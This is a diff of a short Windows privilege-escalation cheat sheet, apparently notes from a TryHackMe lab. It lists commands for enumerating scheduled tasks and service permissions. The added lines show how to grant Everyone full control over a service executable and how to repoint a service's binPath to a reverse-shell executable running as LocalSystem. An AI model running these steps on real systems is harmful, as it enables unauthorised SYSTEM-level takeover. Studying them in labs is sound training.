@@ -2,3 +2,12 @@ Scheduled Tasks:
 schtasks - listing the Scheduled tasks
 schtasks /query /tn vulntask /fo list /v - retrieving detailed information about any of the services in the Scheduled tasks
 icacls c:\tasks\schtask.bat -  file permissions on the executable in the Scheduled tasks
+
+Windows Services:
+sc qc apphostsvc - print the service configuration of a specific service
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe - check the permissions on the executable
+icacls WService.exe /grant Everyone:F - grant full permissions to the Everyone group 
+sc stop windowsscheduler - stop a service
+sc start windowsscheduler - start a service
+accesschk64.exe -qlc thmservice - check for a service DACL (allow you to modify the configuration of a service)
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem - To change the service's associated executable and account
